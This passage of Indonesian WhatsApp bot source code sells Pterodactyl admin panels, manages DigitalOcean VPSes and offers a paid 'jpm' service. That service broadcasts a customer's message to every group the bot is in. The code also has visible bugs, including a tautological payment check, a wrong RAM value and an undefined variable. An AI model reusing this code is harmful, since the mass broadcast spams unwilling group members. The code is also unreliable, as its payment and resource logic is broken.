const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await XPanz.sendMessage(m.chat, {
  footer: `© WhatsApp Bots - 2025`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await XPanz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return ArroganzzReply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
*🗓️ Created :* ${user.created_at.split("T")[0]}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
await XPanz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "buyjasajpm": case "jasajpm": {
if (m.isGroup) return ArroganzzReply("Pembelian jasa jpm hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return ArroganzzReply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
const tgc = await XPanz.groupFetchAllParticipating()
let totalgrup = await Object.keys(tgc)
if (!text) return ArroganzzReply(example(`teksnya bisa dengan kirim foto juga\n\n*Total Grup :* ${totalgrup.length} Grup chat\n*Harga :* Rp10.000`))
let Obj = {}
Obj.harga = "10000"
Obj.pesan = text
if (/image/.test(mime)) Obj.img = qmsg
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* Jasa Jpm Pesan
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await XPanz.sendMessage(m.chat, {
  footer: `© WhatsApp Bots - 2025`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await XPanz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await XPanz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})

let rest
if (Obj.img !== undefined) {
rest = await XPanz.downloadAndSaveMediaMessage(Obj.img)
}
const allgrup = await XPanz.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = Obj.pesan
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await ArroganzzReply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await XPanz.sendMessage(i, pesancoy, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await XPanz.sendMessage(jid, {text: `Jpm *${opsijpm}* berhasil dikirim ke ${res.length} grup chat`}, {quoted: m})
await XPanz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await XPanz.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await XPanz.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return ArroganzzReply("Berhasil membatalkan pembelian ✅")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listdroplet': {
if (!isCreator) return ArroganzzReply(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apiDigitalOcean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
ArroganzzReply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
XPanz.sendMessage(m.chat, { text: mesej }, {quoted: m});
});
} catch (err) {
ArroganzzReply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'restartvps': {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
ArroganzzReply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
ArroganzzReply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
ArroganzzReply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
ArroganzzReply(err);
})

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'rebuild': {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
ArroganzzReply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
XPanz.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
ArroganzzReply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
ArroganzzReply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
ArroganzzReply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sisadroplet": {
if (!isCreator) return ArroganzzReply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return ArroganzzReply(mess.owner)

const dropletInfo = await getDropletInfo();
ArroganzzReply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deldroplet": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
ArroganzzReply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
ArroganzzReply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cvps": {
if (!text) return ArroganzzReply(example("hostname"))
return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram & Cpu Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16GB || CPU 4', 
                  id: `.r16c4 ${text}`
                },
                {
                  title: 'Ram 1GB || CPU 1', 
                  id: `.r1c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 1', 
                  id: `.r2c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 2', 
                  id: `.r2c2 ${text}`
                },
                {
                  title: 'Ram 4GB || CPU 2', 
                  id: `.r4c2 ${text}`
                },      
                {
                  title: 'Ram 8GB || CPU 4', 
                  id: `.r8c4 ${text}`
                }                     
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Spesifikasi Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return ArroganzzReply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await ArroganzzReply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await XPanz.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        ArroganzzReply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return ArroganzzReply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "5gb") {
ram = "5000"
disknya = "4500"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "5500"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "6500"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "7500"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "8500"
cpu = "200"
} else if (command == "10gb") {
ram = "1000"
disknya = "9500"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@Arroganzz.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("0")[0]+"GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disk.charAt(0)+"GB"}
* *Created :* ${desc}`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "© By Arroganzz Botz"
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Apk Login Server Panel\",\"url\":\"${global.apk}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await XPanz.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin": {
if (!isCreator && !isPremium) return ArroganzzReply(mess.owner)
if (!args[0]) {
let list = []
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1}`
})
}
return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
if (!text) return ArroganzzReply(example("server\n\nuntuk melihat list server ketik *.listserver*\ncontoh *.listadmin* 1"))
if (serverpanel.length < 1) return ArroganzzReply("Tidak ada server panel")
if (Number(text) > serverpanel.length) return ArroganzzReply("Server panel tidak ditemukan")
indx = Number(args[0] - 1)
let egg = serverpanel[indx].egg
let nestid = serverpanel[indx].nestid
let loc = serverpanel[indx].loc
let domain = serverpanel[indx].domain
let apikey = serverpanel[indx].apikey
let capikey = serverpanel[indx].capikey
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return ArroganzzReply("Tidak ada admin panel")
var teks = `*── List admin panel server ${args[0]}*\n`
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await XPanz.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel": case "listp": {
if (!isCreator && !isPremium) return ArroganzzReply(mess.owner)
if (serverpanel.length < 1) return ArroganzzReply("Tidak ada server panel")
if (!args[0]) {
let list = []
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1}`
})
}
return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
if (!text) return ArroganzzReply(example("server\n\nuntuk melihat list server ketik *.listserver*\ncontoh *.listpanel* 2"))
if (Number(text) > serverpanel.length) return ArroganzzReply("Server panel tidak ditemukan")
indx = Number(args[0] - 1)
let egg = serverpanel[indx].egg
let nestid = serverpanel[indx].nestid
let loc = serverpanel[indx].loc
let domain = serverpanel[indx].domain
let apikey = serverpanel[indx].apikey
let capikey = serverpanel[indx].capikey
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return ArroganzzReply(`Tidak ada panel di server ${text}`)
let messageText = `*── List server panel pterodactyl server ${text}*\n`
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await XPanz.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (serverpanel.length < 1) return ArroganzzReply("Tidak ada server panel")
if (!args[0]) {
let list = []
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1}`
})
}
return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
if (!text) return ArroganzzReply(example("server\n\nuntuk melihat list server ketik *.listserver*\ncontoh *.deladmin* 1"))
if (Number(text) > serverpanel.length) return ArroganzzReply("Server panel tidak ditemukan")
indx = Number(args[0] - 1)
let domain = serverpanel[indx].domain
let apikey = serverpanel[indx].apikey
if (!args[1]) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
